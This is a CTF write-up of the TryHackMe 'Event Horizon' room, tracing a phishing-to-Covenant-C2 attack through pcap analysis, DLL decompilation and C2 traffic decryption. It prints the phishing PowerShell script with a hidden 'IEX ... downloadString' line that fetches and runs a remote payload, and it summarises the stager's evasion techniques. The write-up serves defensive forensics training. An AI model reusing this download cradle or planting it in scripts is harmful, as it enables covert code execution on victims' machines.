---
title: "TryHackMe: Event Horizon Write-up"
date: 2025-06-30 14:00:00
categories: [TryHackMe, Challenges]
tag: [pcap analysis, Covenant C2]
author: Aisha
---



## Introduction

**Challenge Link:** [Event Horizon](https://tryhackme.com/room/eventhorizonroom)

Join Tom and Dom on a quest to find out what happens when you look beyond the Event Horizon. A quest beyond borders, they need you to utilize all your abilities to find the secrets that were taken when they crossed over to the other side.

## SMTP Credentials Capture

The question was whether the attacker was able to retrieve the credentials for the email service. With that, I filtered for SMTP traffic and found that the email account and password were base64 decoded.

![Alt](/images/EventHorizon/1.png)

decoding it. 

```bash
$ echo "dG9tLmRvbUBldmVudGhvcml6b24udGht" | base64 -d
tom.dom@eventhorizon.thm                                                                                                                 
$ echo "cGFzc3dvcmQ=" | base64 -d
password    
```

## SMTP Data Capture

Follow the SMTP stream to view the full conversation.

![Alt](/images/EventHorizon/2.png)

## EventHorizon Script

The attacker, who is pretending to be Dom, sent a PowerShell script “eventHoizon.ps1” instructing Tom to run it with Administrator privileges

![Alt](/images/EventHorizon/3.png)

When decoding it, an injected command was found at the bottom that downloads a suspicious PowerShell script named “radious”.ps1”

```powershell
# Constants
$G = 6.67430e-11  # Gravitational constant (m^3 kg^-1 s^-2)
$C = 299792458    # Speed of light (m/s)
$solarMass = 1.989e30  # Mass of the Sun (kg)

# Function to calculate the Schwarzschild radius of a black hole
function Get-SchwarzschildRadius {
    param (
        [double]$mass  # Mass of the black hole (kg)
    )
    return (2 * $G * $mass) / ($C * $C)
}

# Function to calculate the mass of a black hole given its radius
function Get-BlackHoleMass {
    param (
        [double]$radius  # Radius of the black hole (m)
    )
    return ($radius * $C * $C) / (2 * $G)
}

# Given radius of the Sun (approximate)
$sunRadius = 6.96342e8  # Radius of the Sun (meters)

# Calculate the mass of a black hole with the same radius as the Sun
$blackHoleMass = Get-BlackHoleMass -radius $sunRadius

# Display results
Write-Output "The mass of a black hole BB which has the same radius as the Sun is approximately $($blackHoleMass/1e30) solar masses."
Write-Output "In kilograms, this is approximately $blackHoleMass kg."

IEX(New-Object Net.WebClient).downloadString('http://10.0.2.45/radius.ps1')
```

## Extracting Initial AES key

Use this filter to view the GET request of the malicious script

```
http contains "radius.ps1"
```

Then follow the TCP stream.

![Alt](/images/EventHorizon/4.png)

When I tried to decode the base64 part, the header was `MZ`, which means it's a Windows executable, and the malicious code does: 

1. decode the base64 
2. decompress it to get a .NET assembly 
3. load that assembly directory into memory
4. execute it

I used this code to extract the base64 strings, then decoded and decompressed it, and finally saved the file as  `.dll` 

```powershell
import base64
import zlib

# The original command string
original_command = r"<add the radious.ps1 command here>"

# Split the command by semicolons to get individual statements
statements = original_command.split(';')

# Find the statement that contains the base64 string
base64_statement = None
for stmt in statements:
    if "FromBase64String" in stmt:
        base64_statement = stmt
        break

if base64_statement:
    # Extract the base64 string from the statement
    # The string is between single quotes
    start_index = base64_statement.find("'") + 1
    end_index = base64_statement.rfind("'")
    base64_string = base64_statement[start_index:end_index]
    
    print("Extracted Base64 String:")
    print(base64_string)
    
    # Decode the base64 string
    decoded_data = base64.b64decode(base64_string)
    
    # The decoded data is compressed with Deflate; decompress it
    decompressed_data = zlib.decompress(decoded_data, -zlib.MAX_WBITS)
    
    print("\nDecompressed Payload (likely a .NET assembly):")
		with open ('payload.dll', 'wb') as f:  
    	f.write(decompressed_data)
else:
    print("Base64 string not found in the command.")
```

We can now check the hash of the DLL file in Virustotal.

```bash
file payload.dll     
payload.dll: PE32 executable for MS Windows 4.00 (GUI), Intel i386 Mono/.Net assembly, 2 sections

md5sum payload.dll                         
124573df9de2b4ed8b7973ff25d2b33a  payload.dll

```

![Alt](/images/EventHorizon/5.png)

This confirms the initial payload is a [Covenant Grunt stager](https://github.com/cobbr/Covenant/tree/master). Covenant is an open-source C2 framework that simplifies offensive .NET tradecraft and collaborative control over compromised hosts. 

To extract the AES key, we need to decompile the DLL file with [ilspycmd](https://github.com/icsharpcode/ILSpy/tree/master/ICSharpCode.ILSpyCmd) (the command line version of **ILSpy**)

```bash
ilspycmd -p -o ./decompiled_source payload.dll
```

![Alt](/images/EventHorizon/6.png)

This is the **Grunt Stager** , which is the first-stage payload for the Covenant .NET command and control (C2) framework. **The code does:**

1. **C2 Communication Setup**
    - **Target Server**: `http://10.0.2.45:8081` (hardcoded C2 server)
    - **Uses custom `CookieWebClient`** to maintain session cookies across requests
    - **User Agent Spoofing**: Masquerades as a legitimate browser:
2. **Encryption & Security**
    - **AES-256-CBC** encryption for message confidentiality
    - **HMAC-SHA256** for message integrity verification
    - **RSA-2048** for asymmetric key exchange
    - **Base64 encoding** for data transmission
3. **Three-Stage Handshake Protocol**
    
    ### **Stage 0: Key Exchange**
    
    - Generates RSA keypair
    - Encrypts public key with shared AES key (`l86TfRDvvJMtXWxr1PSoh1QlXHnZnLwn+wz+aYy3/s8=`)
    - Sends to C2 server to establish secure channel
    
    ### **Stage 1: Authentication**
    
    - Generates 4-byte random challenge
    - Encrypts with session key from Stage 0
    - Verifies server can decrypt it correctly
    
    ### **Stage 2: Payload Delivery**
    
    - Receives and decrypts the main .NET assembly payload
    - **Dynamically loads and executes** the final implant using reflection:
        
        ```csharp
        Assembly.Load(decrypted_bytes).GetTypes()[0].GetMethods()[0].Invoke(...)
        ```
        

**4. Stealth Techniques**

- **Blends with legitimate traffic**: Uses common URLs (`/en-us/index.html`, `/en-us/docs.html`)
- **Cookie-based tracking**: Uses ASP.NET session cookies
- **SSL/TLS evasion**: Can bypass certificate validation
- **Mimics HTTP form data**: Uses parameter `i=...&data=...&session=..`

## Decrypt Covenant Communication

To decrypt the Covenant c2 traffic, we will use [CovenantDecryptor](https://github.com/naacbin/CovenantDecryptor) tool. This tool needs three things:

1. The data traffic of Covenant 
2. The AES key, which we already extracted from the stage 0 binary. 
3. A minidump file of an infected process, which is provided by the challenge `powershell.DMP`.

Upon checking the POST requests, there were requests to `/en-us/index.html` `/en-us/test.html` `/en-us/test.html` which are indicators of Covenant C2 server communications. Refer to this [article](https://community.netwitness.com/s/article/UsingRSANetWitnesstoDetectC-and-C-Covenant) for more IOC

![Alt](/images/EventHorizon/7.png)

Save the traffic data sent to the C2 server to decrypt it.

```bash
tshark -r ../traffic.pcapng -Y "http.request.method == POST" -T fields -e http.file_data > POST.txt
```

- **Note:** If you ran into an issue while installing the tool’s requireuments, install it in virtual enviroments.
    
    ```bash
    python3 -m venv venv
    source venv/bin/activate
    pip install <requirements.txt>
    ```
    

**Stage 0:** Extracts the **RSA modulus** from Covenant communication using **AES key** we optianed from stage 0 binary. 

```bash
python3 CovenantDecryptor/decrypt_covenant_traffic.py modulus -i POST.txt -k "l86TfRDvvJMtXWxr1PSoh1QlXHnZnLwn+wz+aYy3/s8=" -t base64
[+] Modulus: 
2359835709774825745900152219327961579009824307743421199028503565003741685455748715304154383914587350436466126025825814598219604759360
0838968159942365710600229632038220683588355292857269827627629441531340138232479903170003517767232123855669480549375585351505061932112
5370187898499209319025154574113837295486265787322414928848210817223040667397134445224727116668294943393849501140892651034616092462871
8625242381235316290101241607397954905888656721977303035450667162034069936769233167089445050800647382970977763373978005505783016076495
2533106717565747524530416092939471839209977509379614466680479399437631716767966582109
[+] Exponent: 65537
```

**Stage 1**: Using the extracted modulus and the minidump to extract the **RSA private key**

```bash
python3 CovenantDecryptor/extract_privatekey.py -i powershell.DMP -m 23598357097748257459001522193279615790098243077434211990285035650037416854557487153041543839145873504364661260258258145982196047593600838968159942365710600229632038220683588355292857269827627629441531340138232479903170003517767232123855669480549375585351505061932112537018789849920931902515457411383729548626578732241492884821081722304066739713444522472711666829494339384950114089265103461609246287186252423812353162901012416073979549058886567219773030354506671620340699367692331670894450508006473829709777633739780055057830160764952533106717565747524530416092939471839209977509379614466680479399437631716767966582109 -o keys
[-] A pair of P and Q were located, but they do not match the modulus.
[-] A pair of P and Q were located, but they do not match the modulus.
[-] A pair of P and Q were located, but they do not match the modulus.
[-] A pair of P and Q were located, but they do not match the modulus.
[+] Saved private key /home/kali/Documents/tryhackme/eventHorizen/keys/privkey1.pem                  
```

The tool iterates through potential prime factors found in the dump until it successfully reconstructs the private key

**Stage 2:** 

1. Recover the SessionKey
2. Decrypt the Covenant Traffic

With the RAS private key and the initial AES key, recover the session key from the **stage 0 response of Covenant C2**. We first need to retrieve the traffic data and look for stage 0 response data, and save it in a separate file.

```bash
tshark -r traffic.pcapng -q -z follow,tcp,ascii,1490 > stream-1490.txt 
```

![Alt](/images/EventHorizon/8.png)

Now recover the **session key**

```bash
python3 CovenantDecryptor/decrypt_covenant_traffic.py key -i stage0.txt --key "l86TfRDvvJMtXWxr1PSoh1QlXHnZnLwn+wz+aYy3/s8=" -t base64 -r keys/privkey1.pem     
[+] New AES key : 17cd8c53d0b0646186818913c140a201bb5cafee871e9e61ad94cb56614b2751
```

Finally, decrypt the Covenant communication with the **new AES key**:

```bash
python3 CovenantDecryptor/decrypt_covenant_traffic.py decrypt -i POST.txt --key "17cd8c53d0b0646186818913c140a201bb5cafee871e9e61ad94cb56614b2751" -t hex > traffic-decypt.txt
```

![Alt](/images/EventHorizon/9.png)

After decrypting the traffic, we can see that the attacker used Mimikatz to dump the victim's credentials. 

We also notice that Response 8 contains base64 encoded data. To get an idea of what data it is, I decoded the first part, and the output showed a **PNG** header.

```bash
cho "iVBORw0KGgoAAAANSUhEUgAAB4AAAAPRCAYAAAAcP7WHAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvq
GQAAP" | base64 -d
�PNG
▒
                                                       
```

Using CyberChef to decode and render the full image, the result is a desktop image that contains the flag we wanted. 

![Alt](/images/EventHorizon/10.png)

## **Conclusion**

The "Event Horizon" room traced a complete attack chain, from initial email compromise via stolen SMTP credentials to the deployment of the Covenant C2 framework. By analyzing the network traffic, reverse-engineering the malicious PowerShell script, and ultimately decrypting the covert C2 communications using the extracted AES key and a process memory dump, we uncovered the attacker's actions—including credential theft and the exfiltration of a screenshot containing the final flag

## Reference

- [covenant-c2-tutorial](https://blog.netwrix.com/2022/12/16/covenant-c2-tutorial/)
- [CovenantDecryptor](https://github.com/naacbin/CovenantDecryptor)
- [UsingRSANetWitnesstoDetectC-and-C-Covenant](https://community.netwitness.com/s/article/UsingRSANetWitnesstoDetectC-and-C-Covenant)

